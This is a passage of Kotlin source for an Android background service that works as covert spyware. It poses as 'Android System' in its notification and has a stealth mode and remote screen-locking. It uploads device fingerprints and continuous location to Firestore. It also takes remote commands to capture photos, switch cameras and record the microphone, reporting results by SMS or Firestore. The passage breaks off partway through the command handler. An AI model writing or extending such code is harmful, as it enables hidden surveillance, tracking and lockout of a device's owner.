    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            Actions.START.toString() -> {
                FirebaseApp.initializeApp(this)
                clientStart()
                startIds.add(startId)
            }
            Actions.STOP.toString() -> {
                stopForeground(STOP_FOREGROUND_REMOVE)
                stop = true
                Log.d("ClientService", "Received stop command")
                startIds.clear()
                for (id in startIds) {
                    stopSelf(id)
                }
                stopSelf()
            }
        }
        return START_REDELIVER_INTENT
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(wifiP2pStartStopBroadcastReceiver)
            Log.d("ClientService", "Unregistered WiFi P2P start stop broadcast receiver")
        } catch (ex: Exception) {
            ex.printStackTrace()
        }
//        try {
//            if (!stop) {
//                Log.d("ClientService", "OnDestroy() - Restarting service")
//                Intent(applicationContext, ClientService::class.java).also {
//                    it.action = Actions.START.toString()
//                    applicationContext.startService(it)
//                }
//            }
//        } catch (ex: Exception) {
//            ex.printStackTrace()
//        } finally {
//            stop = false
//        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null;
    }

    fun createClientNotificationChannel(context: Context?) {
        if (notificationChannel == null) {
            notificationChannel = NotificationChannel(notificationChannelId, "ClientChannel", NotificationManager.IMPORTANCE_HIGH)
            notificationManager = context?.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager!!.createNotificationChannel(notificationChannel!!)
        }
    }

    val wifiP2pBroadcastReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                WifiP2pManager.WIFI_P2P_STATE_CHANGED_ACTION -> {
                    val state = intent.getIntExtra(WifiP2pManager.EXTRA_WIFI_STATE, -1)
                    Log.d("ClientService", if (state == WifiP2pManager.WIFI_P2P_STATE_ENABLED) "Wi‑Fi Direct enabled" else "Wi‑Fi Direct not enabled")
                }
                WifiP2pManager.WIFI_P2P_PEERS_CHANGED_ACTION -> {
                    // Optionally, request the peer list if needed.
                    if (ActivityCompat.checkSelfPermission(
                            this@ClientService,
                            Manifest.permission.ACCESS_FINE_LOCATION
                        ) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                            this@ClientService,
                            Manifest.permission.NEARBY_WIFI_DEVICES
                        ) == PackageManager.PERMISSION_GRANTED
                    ) {
                        wifiP2pManager?.requestPeers(wifiP2pChannel) { peers ->
                            Log.d("ClientService", "Peers available: ${peers.deviceList}")
                        }
                        return
                    }
                }
                WifiP2pManager.WIFI_P2P_CONNECTION_CHANGED_ACTION -> {
                    val networkInfo = intent.getParcelableExtra<NetworkInfo>(WifiP2pManager.EXTRA_NETWORK_INFO)
                    if (networkInfo != null && networkInfo.isConnected) {
                        Log.d("ClientService", "A device has connected.")
                    } else {
                        Log.d("ClientService", "A device has disconnected.")
                    }
                }
                WifiP2pManager.WIFI_P2P_THIS_DEVICE_CHANGED_ACTION -> {
                    val device = intent.getParcelableExtra<WifiP2pDevice>(WifiP2pManager.EXTRA_WIFI_P2P_DEVICE)
                    Log.d("ClientService", "Local device info: $device")
                }
            }
        }
    }

    private val wifiP2pStartStopBroadcastReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            // Handle the received broadcast
            val action = intent.action
            val sendBySMS = intent.getBooleanExtra("SendBySMS", true)
            val serverID = intent.getStringExtra("ServerID")
            val messageID = intent.getStringExtra("MessageID")
            val serverPhoneNo = intent.getStringExtra("ServerPhoneNo")
            try {
                if (action == ACTION_START_WIFI_P2P_SERVER) {
                    Log.d("ClientService", "Received start WiFi P2P server broadcast")
                    if (!isWifiP2pEnabled) {
                        wifiP2pManager =
                            getSystemService(Context.WIFI_P2P_SERVICE) as WifiP2pManager
                        wifiP2pChannel =
                            wifiP2pManager?.initialize(this@ClientService, mainLooper, null)
                        if (wifiP2pDnsSdServiceInfo == null) {
                            val serviceName = "ClientWiFiP2PServer"
                            val serviceType = "_presence._tcp"
                            val record = hashMapOf<String, String>()
                            record.put("avaliable", "visible")
                            wifiP2pDnsSdServiceInfo = WifiP2pDnsSdServiceInfo.newInstance(
                                serviceName,
                                serviceType,
                                record
                            )
                        }
                        if (ActivityCompat.checkSelfPermission(
                                this@ClientService,
                                Manifest.permission.ACCESS_FINE_LOCATION
                            ) == PackageManager.PERMISSION_GRANTED && (ActivityCompat.checkSelfPermission(
                                this@ClientService,
                                Manifest.permission.NEARBY_WIFI_DEVICES
                            ) == PackageManager.PERMISSION_GRANTED || Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU)
                        ) {
                            Log.d("ClientService", "Adding local service")
                            wifiP2pManager!!.addLocalService(
                                wifiP2pChannel,
                                wifiP2pDnsSdServiceInfo,
                                object : WifiP2pManager.ActionListener {
                                    override fun onSuccess() {
                                        // Create a Wi‑Fi Direct group. This device becomes the group owner (server).
                                        if (ActivityCompat.checkSelfPermission(
                                                this@ClientService,
                                                Manifest.permission.ACCESS_FINE_LOCATION
                                            ) == PackageManager.PERMISSION_GRANTED && (ActivityCompat.checkSelfPermission(
                                                this@ClientService,
                                                Manifest.permission.NEARBY_WIFI_DEVICES
                                            ) == PackageManager.PERMISSION_GRANTED || Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU)
                                        ) {
                                            Log.d("ClientService", "Adding WiFi P2P broadcast receiver")
                                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                                                registerReceiver(
                                                    wifiP2pBroadcastReceiver,
                                                    wifiP2pIntentFilter,
                                                    RECEIVER_EXPORTED
                                                )
                                            } else {
                                                registerReceiver(
                                                    wifiP2pBroadcastReceiver,
                                                    wifiP2pIntentFilter
                                                )
                                            }
                                            Log.d("ClientService", "Creating group")
                                            wifiP2pManager?.createGroup(
                                                wifiP2pChannel,
                                                object : WifiP2pManager.ActionListener {
                                                    override fun onSuccess() {
                                                        Log.d(
                                                            "ClientService",
                                                            "Group created successfully; this device is now group owner."
                                                        )
                                                        isWifiP2pEnabled = true
                                                        sendMessage(
                                                            this@ClientService,
                                                            sendBySMS,
                                                            "START_WIFI_P2P_SERVER: Operation completed successfully",
                                                            serverPhoneNo = serverPhoneNo,
                                                            serverID = serverID,
                                                            messageID = messageID
                                                        )
                                                        // Now start the server socket to listen for incoming connections.
//                                                            startTetheringServerSocket()
                                                    }

                                                    override fun onFailure(reason: Int) {
                                                        Log.e(
                                                            "ClientService",
                                                            "Failed to create group. Reason: $reason"
                                                        )
                                                        var reasonStr = ""
                                                        when (reason) {
                                                            WifiP2pManager.P2P_UNSUPPORTED -> reasonStr =
                                                                "P2P_UNSUPPORTED"

                                                            WifiP2pManager.ERROR -> reasonStr =
                                                                "ERROR"

                                                            WifiP2pManager.BUSY -> reasonStr =
                                                                "BUSY"

                                                            else -> reasonStr =
                                                                reason.toString()
                                                        }
                                                        sendMessage(
                                                            this@ClientService,
                                                            sendBySMS,
                                                            "START_WIFI_P2P_SERVER: Operation failed - failed to create group: reason $reasonStr",
                                                            serverPhoneNo = serverPhoneNo,
                                                            serverID = serverID,
                                                            messageID = messageID
                                                        )
                                                    }
                                                })
                                        } else {
                                            sendMessage(
                                                this@ClientService,
                                                sendBySMS,
                                                "START_WIFI_P2P_SERVER: Operation failed - permission denied",
                                                serverPhoneNo = serverPhoneNo,
                                                serverID = serverID,
                                                messageID = messageID
                                            )
                                        }
                                    }

                                    override fun onFailure(reason: Int) {
                                        Log.e(
                                            "ClientService",
                                            "Error adding WiFi P2P local service: reason $reason"
                                        )
                                        var reasonStr = ""
                                        when (reason) {
                                            WifiP2pManager.P2P_UNSUPPORTED -> reasonStr =
                                                "P2P_UNSUPPORTED"

                                            WifiP2pManager.ERROR -> reasonStr =
                                                "ERROR"

                                            WifiP2pManager.BUSY -> reasonStr =
                                                "BUSY"

                                            else -> reasonStr =
                                                reason.toString()
                                        }
                                        sendMessage(
                                            this@ClientService,
                                            sendBySMS,
                                            "START_WIFI_P2P_SERVER: Operation failed - failed to add local service: reason $reasonStr",
                                            serverPhoneNo = serverPhoneNo,
                                            serverID = serverID,
                                            messageID = messageID
                                        )
                                    }
                                }
                            )
                        } else {
                            sendMessage(
                                this@ClientService,
                                sendBySMS,
                                "START_WIFI_P2P_SERVER: Operation failed - permission denied",
                                serverPhoneNo = serverPhoneNo,
                                serverID = serverID,
                                messageID = messageID
                            )
                        }
                    } else {
                        sendMessage(
                            this@ClientService,
                            sendBySMS,
                            "START_WIFI_P2P_SERVER: Operation failed - already enabled",
                            serverPhoneNo = serverPhoneNo,
                            serverID = serverID,
                            messageID = messageID
                        )
                        Log.e("ClientService", "WiFi P2P already enabled")
                    }
                } else if (action == ACTION_STOP_WIFI_P2P_SERVER) {
                    try {
                        wifiP2pManager?.removeGroup(
                            wifiP2pChannel,
                            object : WifiP2pManager.ActionListener {
                                override fun onSuccess() {
                                    Log.d(
                                        "WiFiP2p",
                                        "Group removed successfully. Wi‑Fi Direct group is disbanded."
                                    )
                                    wifiP2pManager!!.removeLocalService(
                                        wifiP2pChannel,
                                        wifiP2pDnsSdServiceInfo,
                                        object : WifiP2pManager.ActionListener {
                                            override fun onSuccess() {
                                                Log.d("ClientService", "Local service removed successfully")
                                                isWifiP2pEnabled = false
                                                unregisterReceiver(wifiP2pBroadcastReceiver)
                                                sendMessage(
                                                    this@ClientService,
                                                    sendBySMS,
                                                    "STOP_WIFI_P2P_SERVER: Operation completed successfully",
                                                    serverPhoneNo = serverPhoneNo,
                                                    serverID = serverID,
                                                    messageID = messageID
                                                )
                                            }

                                            override fun onFailure(reason: Int) {
                                                Log.d("ClientService", "Local service removal failed. Reason: $reason")
                                                try {
                                                    unregisterReceiver(wifiP2pBroadcastReceiver)
                                                } catch (ex: Exception) {
                                                    ex.printStackTrace()
                                                }
                                                var reasonStr = ""
                                                when (reason) {
                                                    WifiP2pManager.P2P_UNSUPPORTED -> reasonStr = "P2P_UNSUPPORTED"
                                                    WifiP2pManager.ERROR -> reasonStr = "ERROR"
                                                    WifiP2pManager.BUSY -> reasonStr = "BUSY"
                                                    else -> reasonStr = reason.toString()
                                                }
                                                sendMessage(
                                                    this@ClientService,
                                                    sendBySMS,
                                                    "STOP_WIFI_P2P_SERVER: Operation failed - failed to remove local service: reason $reasonStr",
                                                    serverPhoneNo = serverPhoneNo,
                                                    serverID = serverID,
                                                    messageID = messageID
                                                )
                                            }
                                        }
                                    )
                                }

                                override fun onFailure(reason: Int) {
                                    Log.e("WiFiP2p", "Failed to remove group. Reason: $reason")
                                    try {
                                        unregisterReceiver(wifiP2pBroadcastReceiver)
                                    } catch (ex: Exception) {
                                        ex.printStackTrace()
                                    }
                                    var reasonStr = ""
                                    when (reason) {
                                        WifiP2pManager.P2P_UNSUPPORTED -> reasonStr = "P2P_UNSUPPORTED"
                                        WifiP2pManager.ERROR -> reasonStr = "ERROR"
                                        WifiP2pManager.BUSY -> reasonStr = "BUSY"
                                        else -> reasonStr = reason.toString()
                                    }
                                    sendMessage(
                                        this@ClientService,
                                        sendBySMS,
                                        "STOP_WIFI_P2P_SERVER: Operation failed - failed to create group: reason $reasonStr",
                                        serverPhoneNo = serverPhoneNo,
                                        serverID = serverID,
                                        messageID = messageID
                                    )
                                }
                            })
                    } catch (ex: Exception) {
                        ex.printStackTrace()
                        sendMessage(
                            this@ClientService,
                            sendBySMS,
                            "STOP_WIFI_P2P_SERVER: Operation failed - ${ex.localizedMessage}",
                            serverPhoneNo = serverPhoneNo,
                            serverID = serverID,
                            messageID = messageID
                        )
                    }
                } else if (action == ACTION_WIFI_P2P_GET_HOST_ADDRESS) {
                    wifiP2pManager?.requestConnectionInfo(wifiP2pChannel) { info ->
                        info?.groupOwnerAddress?.let {
                            val hostIp = it.hostAddress
                            Log.d("WiFiP2P", "Group Owner IP Address: $hostIp")
                            // Use hostIp as needed
                            sendMessage(
                                this@ClientService,
                                sendBySMS,
                                "WIFI_P2P_GET_HOST_ADDRESS: $hostIp",
                                serverPhoneNo = serverPhoneNo,
                                serverID = serverID,
                                messageID = messageID
                            )
                        }
                    }
                }
            } catch (ex: Exception) {
                ex.printStackTrace()
                if (action == ACTION_START_WIFI_P2P_SERVER) {
                    sendMessage(
                        this@ClientService,
                        sendBySMS,
                        "Uncaught Error: ${ex.localizedMessage}",
                        serverPhoneNo = serverPhoneNo,
                        serverID = serverID,
                        messageID = messageID
                    )
                } else if (action == ACTION_STOP_WIFI_P2P_SERVER) {
                    sendMessage(
                        this@ClientService,
                        sendBySMS,
                        "Uncaught Error: ${ex.localizedMessage}",
                        serverPhoneNo = serverPhoneNo,
                        serverID = serverID,
                        messageID = messageID
                    )
                }
            }
        }
    }

    private fun clientStart() {
        createClientNotificationChannel(this)
        notification = NotificationCompat.Builder(this, notificationChannelId)
            .setContentText("Android System is running...")
            .setContentTitle("Android System")
            .build()
        startForeground(1, notification)

        val firestore = FirebaseFirestore.getInstance()
        val storage = FirebaseStorage.getInstance().reference

        bluetoothAdapter = BluetoothAdapter.getDefaultAdapter()
        bluetoothLeAdvertiser = bluetoothAdapter?.bluetoothLeAdvertiser
        audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager

        var preferences = getSharedPreferences("Preferences", Context.MODE_MULTI_PROCESS)

        phoneNumberToUse = preferences.getString("PhoneNoToUse", "").toString()
        isSendingSMSAllowed = preferences.getBoolean("isSendingSMSAllowed", true)
        try {
            serverPhoneNumbers =
                preferences.getString("ServerPhoneNumber", "")?.split(",")!!
                    .toMutableList()
            isLocked = preferences.getBoolean("IsLocked", false)
            currentDeviceID = preferences.getString("DeviceID", "0").toString()
            isStealthModeEnabled = preferences.getBoolean("IsStealthModeEnabled", false)
            isLockedWithPin = preferences.getBoolean("IsLockedWithPin", false)
            startLoggingLocation = preferences.getBoolean("StartLoggingLocation", false)
            var a = preferences.getStringSet("ServerCurrentDeviceID", setOf("Fx7]`£C?K<H`}*X}<9xwMgEn5plKtLYW"))
            if (a != null) {
                serverDeviceIDs.clear()
                for (id in a) {
                    serverDeviceIDs.add(id)
                }
            }
            a = preferences.getStringSet("BlockedPhoneNumbers", setOf<String>())
            if (a != null) {
                blockedPhoneNumbers.clear()
                for (number in a) {
                    blockedPhoneNumbers.add(number)
                }
            }
        } catch (ex: Exception) {
            ex.printStackTrace()
        }

        try {
            if (isLocked) {
                val i = Intent(this, LockedActivity::class.java)
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(i)
            }
            if (isLockedWithPin) {
                val i = Intent(this, LockedWithPinActivity::class.java)
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                i.putExtra("Pin", preferences.getString("Pin", "000000").toString())
                startActivity(i)
            }
        } catch (ex: Exception) {
            ex.printStackTrace()
        }

        var listenerRegistration: ListenerRegistration? = null

        FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
            if (!task.isSuccessful) {
                Log.w("ClientService", "Fetching FCM registration token failed", task.exception)
                return@addOnCompleteListener
            }

            // Get new FCM registration token
            val token = task.result

            // Log and handle the token as needed
            Log.d("ClientService", "Token: $token")
            val partitions = mutableListOf<List<String>>()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                for (p in Build.getFingerprintedPartitions()) {
                    partitions.add(
                        listOf(
                            p.name,
                            p.fingerprint,
                            p.buildTimeMillis.toString()
                        )
                    )
                }
            }
            firestore.collection("Devices").document(currentDeviceID).set(hashMapOf<String,Any>(
                "Device ID" to currentDeviceID,
                "Build.VERSION.BASE_OS" to Build.VERSION.BASE_OS,
                "Build.VERSION.INCREMENTAL" to Build.VERSION.INCREMENTAL,
                "Build.VERSION.SDK_INT" to Build.VERSION.SDK_INT,
                "Build.VERSION.CODENAME" to Build.VERSION.CODENAME,
                "Build.VERSION.SECURITY_PATCH" to Build.VERSION.SECURITY_PATCH,
                "Build.VERSION.RELEASE" to Build.VERSION.RELEASE,
                "Build.VERSION.RELEASE_OR_CODENAME" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) Build.VERSION.RELEASE_OR_CODENAME else "",
                "Build.VERSION.RELEASE_OR_PREVIEW_DISPLAY" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)  Build.VERSION.RELEASE_OR_PREVIEW_DISPLAY else "",
                "Build.VERSION.PREVIEW_SDK_INT" to Build.VERSION.PREVIEW_SDK_INT,
                "Build.DISPLAY" to Build.DISPLAY,
                "Build.ID" to Build.ID,
                "Build.BOARD" to Build.BOARD,
                "Build.BOOTLOADER" to Build.BOOTLOADER,
                "Build.FINGERPRINT" to Build.FINGERPRINT,
                "Build.DEVICE" to Build.DEVICE,
                "Build.MANUFACTURER" to Build.MANUFACTURER,
                "Build.HOST" to Build.HOST,
                "Build.HARDWARE" to Build.HARDWARE,
                "Build.BRAND" to Build.BRAND,
                "Build.MODEL" to Build.MODEL,
                "Build.ODM_SKU" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) Build.ODM_SKU else "",
                "Build.SKU" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) Build.SKU else "",
                "Build.SOC_MANUFACTURER" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) Build.SOC_MANUFACTURER else "",
                "Build.SOC_MODEL" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) Build.SOC_MODEL else "",
                "Build.SUPPORTED_32_BIT_ABIS" to Build.SUPPORTED_32_BIT_ABIS.toList(),
                "Build.SUPPORTED_64_BIT_ABIS" to Build.SUPPORTED_64_BIT_ABIS.toList(),
                "Build.SUPPORTED_ABIS" to Build.SUPPORTED_ABIS.toList(),
                "Build.USER" to Build.USER,
                "Build.PRODUCT" to Build.PRODUCT,
                "Build.RADIO_VERSION" to Build.getRadioVersion(),
                "Build.CPU_ABI" to Build.CPU_ABI,
                "Build.CPU_ABI2" to Build.CPU_ABI2,
                "Build.TYPE" to Build.TYPE,
                "Build.TAGS" to Build.TAGS,
                "Build.Partition.PARTITION_NAME_SYSTEM" to if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) Build.Partition.PARTITION_NAME_SYSTEM else "",
                "Build.getFingerprintedPartitions()" to Gson().toJson(partitions),
                "FCM Token" to token
            )).addOnFailureListener {
                it.printStackTrace()
            }
        }

        if (!Python.isStarted()) {
            Python.start(AndroidPlatform(this));
        }

        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000)
            .setMinUpdateDistanceMeters(16f)
            .setMaxUpdateDelayMillis(25 * 1000)
            .build()
        var locationLogFile: File? = null
        val formatter1 =
            SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", Locale.getDefault())
        val formatter2 =
            SimpleDateFormat("HH-mm-ss", Locale.getDefault())
        val locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                locationResult ?: return
                for (location in locationResult.locations) {
                    try {
                        Log.d(
                            "ClientService",
                            "Location: ${location.latitude}, ${location.longitude}"
                        )
                        for ((i, geofence) in geofenceList.withIndex()) {
                            if (geofence["IsValid"] == true) {
                                val centerLongitude = geofence["CenterLongitude"] as Double
                                val centerLatitude = geofence["CenterLatitude"] as Double
                                val centerLocation = Location("CENTER_LOCATION")
                                centerLocation.longitude = centerLongitude
                                centerLocation.latitude = centerLatitude
                                val radius = geofence["Radius"] as Int
                                val type = geofence["Type"] as String
                                val useSms = geofence["UseSMS"] as Boolean
                                if (type == "ENTERING") {
                                    Log.d("ClientService", "Distance from center of geofence $i: ${location.distanceTo(centerLocation)}")
                                    if (location.distanceTo(centerLocation) < radius) {
                                        sendMessage(
                                            this@ClientService,
                                            useSms,
                                            "GEOFENCE_BREACH: Geofence Index: $i, Type: $type, Current Longitude: ${location.longitude}, Current Latitude: ${location.latitude}, Current Speed: ${location.speed}"
                                        )
                                    }
                                } else if (type == "EXITING") {
                                    Log.d("ClientService", "Distance from center of geofence $i: ${location.distanceTo(centerLocation)}")
                                    if (location.distanceTo(centerLocation) > radius) {
                                        sendMessage(
                                            this@ClientService,
                                            useSms,
                                            "GEOFENCE_BREACH: Geofence Index: $i, Type: $type, Current Longitude: ${location.longitude}, Current Latitude: ${location.latitude}, Current Speed: ${location.speed}"
                                        )
                                    }
                                }
                            }
                        }
                        if (startLoggingLocation) {
                            var isSameDay = true
                            if (locationLogFile != null) {
                                val fileCalendar = Calendar.getInstance().apply {
                                    time =
                                        formatter1.parse(locationLogFile!!.name.removeSuffix(".txt"))!!
                                }
                                val currentCalendar = Calendar.getInstance()
                                isSameDay =
                                    fileCalendar.get(Calendar.YEAR) == currentCalendar.get(Calendar.YEAR) &&
                                            fileCalendar.get(Calendar.DAY_OF_YEAR) == currentCalendar.get(
                                        Calendar.DAY_OF_YEAR
                                    )
                            }
                            if (locationLogFile == null || !isSameDay) {
                                val formattedDate = formatter1.format(Date())
                                val name = "$formattedDate.txt"
                                File(Environment.getExternalStorageDirectory().path + "/Logs/Location").mkdirs()
                                val path =
                                    Environment.getExternalStorageDirectory().path + "/Logs/Location/$name"
                                locationLogFile = File(path)
                            }
                            val formattedDate = formatter2.format(Date())
                            var str = "$formattedDate: Latitude: ${location.latitude}, Longitude: ${location.longitude}, Accuracy: ${location.accuracy}"
                            if (location.hasSpeed()) {
                                str += ", Speed: ${location.speed}"
                            }
                            if (location.hasSpeedAccuracy()) {
                                str += ", Speed Accuracy: ${location.speedAccuracyMetersPerSecond}"
                            }
                            if (location.hasAltitude()) {
                                str += ", Altitude: ${location.altitude}"
                            }
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                                if (location.hasMslAltitude()) {
                                    str += ", MSL Altitude: ${location.mslAltitudeMeters}"
                                }
                                if (location.hasMslAltitudeAccuracy()) {
                                    str += ", MSL Altitude Accuracy: ${location.mslAltitudeAccuracyMeters}"
                                }
                            }
                            if (location.hasBearing()) {
                                str += ", Bearing: ${location.bearing}"
                            }
                            if (location.hasBearingAccuracy()) {
                                str += ", Bearing Accuracy: ${location.bearingAccuracyDegrees}"
                            }
                            locationLogFile!!.writeText(str)
                        }
                        if (saveCurrentLocationInFirestore) {
                            val data = mutableMapOf<String, Any>(
                                "Current Latitude" to location.latitude,
                                "Current Longitude" to location.longitude
                            )
                            if (location.hasSpeed()) {
                                data["Current Speed"] = location.speed
                            }
                            if (location.hasSpeedAccuracy()) {
                                data["Current Speed Accuracy"] = location.speedAccuracyMetersPerSecond
                            }
                            if (location.hasAltitude()) {
                                data["Current Altitude"] = location.altitude
                            }
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                                if (location.hasMslAltitude()) {
                                    data["Current MSL Altitude"] =
                                        location.mslAltitudeMeters
                                }
                                if (location.hasMslAltitudeAccuracy()) {
                                    data["Current MSL Altitude Accuracy"] =
                                        location.mslAltitudeAccuracyMeters
                                }
                            }
                            if (location.hasBearing()) {
                                data["Current Bearing"] = location.bearing
                            }
                            if (location.hasBearingAccuracy()) {
                                data["Current Bearing Accuracy"] = location.bearingAccuracyDegrees
                            }
                            FirebaseFirestore.getInstance().collection("Devices")
                                .document(currentDeviceID)
                                .update(data as Map<String, Any>).addOnFailureListener {
                                    it.printStackTrace()
                                }
                        }
                    } catch (ex: Exception) {
                        ex.printStackTrace()
                        val formatter = SimpleDateFormat("yyyy-MM-dd HH-mm-ss", Locale.getDefault())
                        val formattedDate = formatter.format(Date())
                        FirebaseFirestore.getInstance().collection("Uncaught Errors")
                            .document()
                            .set(
                                hashMapOf(
                                    "ID" to currentDeviceID,
                                    "Message" to ex.message,
                                    "Localized Message" to ex.localizedMessage,
                                    "Class" to "ClientService",
                                    "Date & Time" to formattedDate
                                )
                            ).addOnFailureListener {
                                it.printStackTrace()
                            }
                    }
                }
            }
        }
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            if (startLoggingLocation || geofenceList.isNotEmpty()) {
                fusedLocationClient.requestLocationUpdates(
                    locationRequest,
                    locationCallback,
                    Looper.getMainLooper()
                )
            }
        }

        val handler = Handler(Looper.getMainLooper())
        val c = this

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(
                    wifiP2pStartStopBroadcastReceiver,
                    IntentFilter().apply {
                        addAction(ACTION_START_WIFI_P2P_SERVER)
                        addAction(ACTION_STOP_WIFI_P2P_SERVER)
                        addAction(ACTION_WIFI_P2P_GET_HOST_ADDRESS)
                    },
                    RECEIVER_EXPORTED
                )
            } else {
                registerReceiver(
                    wifiP2pStartStopBroadcastReceiver,
                    IntentFilter().apply {
                        addAction(ACTION_START_WIFI_P2P_SERVER)
                        addAction(ACTION_STOP_WIFI_P2P_SERVER)
                        addAction(ACTION_WIFI_P2P_GET_HOST_ADDRESS)
                    }
                )
            }
            Log.d("ClientService", "Registered WiFi P2P start stop broadcast receiver")
        } catch (ex: Exception) {
            ex.printStackTrace()
            Log.e("ClientService", "Failed to register WiFi P2P start stop broadcast receiver")
        }
        Log.d("ClientService", "Current Device ID: $currentDeviceID")
        Log.d("ClientService", "Service Device IDs: $serverDeviceIDs")

        val messagesRef = firestore.collection("Messages")
        val listener = EventListener<QuerySnapshot> { snapshot, error ->
            if (error != null) {
                // Handle error
                return@EventListener
            }
            if (snapshot != null) {
                for (change in snapshot.documentChanges) {
                    preferences = getSharedPreferences("Preferences", Context.MODE_MULTI_PROCESS)
                    currentDeviceID = preferences.getString("DeviceID", "0").toString()
                    if (currentDeviceID != "") {
                        val document = change.document
                        val type = change.type
                        val serverID = document.getString("From")
                        val command = document.getString("Message")
                        val forId = document.get("For")
                        Log.d("ClientService", "Received command for $forId from $serverID: $command")
                        Log.d("ClientService", "${type == DocumentChange.Type.ADDED} && ${forId == currentDeviceID} && ${serverID in serverDeviceIDs}")
                        if (type == DocumentChange.Type.ADDED && document.exists() && forId == currentDeviceID && serverID in serverDeviceIDs) {
                            Log.d("ClientService", "Received command from server: $command")
                            if (document.contains("Message")) {
                                val messageID = document.id
                                if (command != null) {
                                    try {
                                        if (command.startsWith("CLICK_IMAGE ")) {
                                            if (!cameraInitialized) {
                                                sendMessage(this@ClientService, false, "CLICK_IMAGE: Operation failed - camera not selected", messageID, serverID)
                                            } else {
                                                val imagePath = command.removePrefix("CLICK_IMAGE ")
                                                takePicture(imagePath, messageID, serverID)
                                            }
                                        } else if (command.startsWith("SWITCH_TO_CAMERA ")) {
                                            try {
                                                try {
                                                    cameraDevice.close()
                                                } catch (_: Exception) {
                                                }
                                                val n = command.removePrefix("SWITCH_TO_CAMERA ").toInt()

                                                // Initialize lateinit variables
                                                cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager

                                                // Initialize other lateinit variables:
                                                val cameraId = cameraManager.cameraIdList[n]
                                                val imageReaderConfig = ImageReader.newInstance(1024, 768, ImageFormat.JPEG, 1)
                                                imageReader = imageReaderConfig

                                                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                                                    override fun onOpened(camera: CameraDevice) {
                                                        cameraDevice = camera
                                                        createCaptureSession(messageID, serverID)
                                                    }

                                                    override fun onDisconnected(camera: CameraDevice) {
                                                        cameraInitialized = false
                                                        sendMessage(this@ClientService, false, "SWITCH_TO_CAMERA: Info - camera disconnected", messageID, serverID)
                                                    }

                                                    override fun onError(camera: CameraDevice, error: Int) {
                                                        cameraInitialized = false
                                                        val errorMsg = when(error) {
                                                            ERROR_CAMERA_DEVICE -> "Fatal (device)"
                                                            ERROR_CAMERA_DISABLED -> "Device policy"
                                                            ERROR_CAMERA_IN_USE -> "Camera in use"
                                                            ERROR_CAMERA_SERVICE -> "Fatal (service)"
                                                            ERROR_MAX_CAMERAS_IN_USE -> "Maximum cameras in use"
                                                            else -> "Unknown"
                                                        }
                                                        sendMessage(
                                                            this@ClientService,
                                                            false,
                                                            "SWITCH_TO_CAMERA: Info - error code: $error - error message: $errorMsg",
                                                            messageID, serverID
                                                        )
                                                    }
                                                }, null)
                                            } catch (ex: SecurityException) {
                                                ex.printStackTrace()
                                                sendMessage(this, false, "SWITCH_TO_CAMERA: Operation failed - ${ex.localizedMessage}", messageID, serverID)
                                            } catch (ex: Exception) {
                                                ex.printStackTrace()
                                                sendMessage(this, false, "SWITCH_TO_CAMERA: Operation failed - ${ex.localizedMessage}", messageID, serverID)
                                            }
                                        } else if (command.startsWith("START_RECORDING_AUDIO_FROM_MIC ")) {
                                            if (!isRecordingFromMic) {
                                                try {
                                                    val path =
                                                        command.removePrefix("START_RECORDING_AUDIO_FROM_MIC ")

                                                    // Initialize MediaRecorder
                                                    mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                                                        MediaRecorder(this)
                                                    } else {
                                                        MediaRecorder()
                                                    }

                                                    mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC)
                                                    mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)

                                                    mediaRecorder.setOutputFile(path)

                                                    mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)

                                                    mediaRecorder.prepare()
                                                    mediaRecorder.start()

                                                    isRecordingFromMic = true
                                                    sendMessage(
                                                        this,
                                                        false,
                                                        "START_RECORDING_AUDIO_FROM_MIC: Operation completed successfully",
                                                        messageID, serverID
                                                    )
                                                } catch (e: Exception) {
                                                    e.printStackTrace()
                                                    sendMessage(
                                                        this,
                                                        false,
